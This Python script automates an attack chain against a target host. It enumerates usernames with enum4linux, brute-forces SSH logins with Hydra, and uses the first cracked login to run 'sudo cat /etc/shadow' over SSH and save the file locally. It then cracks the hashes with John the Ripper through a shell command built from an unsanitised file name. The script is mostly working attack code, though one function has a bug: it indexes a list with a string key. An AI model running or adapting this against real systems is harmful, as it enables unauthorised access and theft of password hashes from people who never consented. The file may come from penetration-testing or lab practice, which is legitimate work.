import subprocess
import re
import json
import paramiko
import os
import shutil

def run_enum4linux(target):
    """
    Function to run enum4linux on the target.
    Returns a list of usernames found.
    """
    try:
        output = subprocess.check_output(["enum4linux",'-U', target], universal_newlines=True)
        usernames = []
        usernames['Target'] = target
        for line in output.splitlines():
            if line.startswith('user:'):
                match = re.search(r'\[(.*?)\]', line)
                if match:
                    username = match.group(1)
                    usernames.append(username)
        return usernames 
    except subprocess.CalledProcessError:
        print("Error: Failed to run enum4linux.")
        return []
    
def save_to_json(usernames):
    """
    Function to save data to a JSON file.
    """
    data = [{"username": username} for username in usernames]
    with open("./Exports/enum_user_results.json", 'w') as f:
        json.dump(data, f, indent=4)
    

def hydra_bruteforce_ssh(target, usernames):
    """
    Function to use Hydra to brute force SSH using the provided usernames.
    Returns a dictionary of successful login credentials.
    """
    found_credentials = {}
    for username in usernames:
        try:
            print(username)
            # Run Hydra to brute force SSH
            hydra_output = subprocess.check_output(["hydra", "-l", username, "-P", "./Assets/passwords.txt", "-t", "4", target, "ssh"], text=True)
            # Parse the output to extract successful login credentials
            for line in hydra_output.splitlines():
                if "login:" in line:
                    login_index = hydra_output.find("login:") + len("login:")
                    login = hydra_output[login_index:].split()[0]
                    password_index = hydra_output.find("password:") + len("password:")
                    password = hydra_output[password_index:].split()[0]
                    found_credentials[username] = {"login": login, "password": password}
                    break
        except subprocess.CalledProcessError:
            pass
    return found_credentials

def save_credentials_to_json(credentials):
    with open("./Exports/found_credentials.json", 'w') as f:
        json.dump(credentials, f, indent=4)

def copy_shadow_file(target, credentials_list):
    try:
        iter_items = iter(credentials_list.items())

        # Get the first item from the iterator
        first_item = next(iter_items)

        # Get the first element from the credentials list
        credentials = first_item[1]
        
        login = credentials["login"]
        password = credentials.get("password")
        
        print("Copying /etc/shadow file using SSH...")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=login, password=password)
        
        # Execute the cat command to read the contents of /etc/shadow
        stdin, stdout, stderr = ssh.exec_command("sudo cat /etc/shadow")
        
        # Read the output of the command
        shadow_content = stdout.read().decode()
        
        # Write the contents to a local text file
        with open("shadow_copy.txt", "w") as f:
            f.write(shadow_content)
        
        ssh.close()
        print("Successfully copied /etc/shadow file to shadow_copy.txt.")
    except paramiko.AuthenticationException as e:
        print("Authentication failed. Please check the credentials.")
    except paramiko.SSHException as e:
        print("SSH connection failed. Please check the SSH configuration.")
    except Exception as e:
        print(f"Error copying /etc/shadow file: {e}")

def crack_passwords(hash_file):
    try:
        # Run John the Ripper using subprocess
        command = f"john --format=sha512 {hash_file}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            print("Password cracked successfully.")
            # Read the cracked passwords from John's output file
            with open("john.pot", "r") as pot_file:
                cracked_passwords = pot_file.readlines()
                return cracked_passwords
        else:
            print(f"Failed to crack passwords. Error: {stderr.decode('utf-8')}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None
    



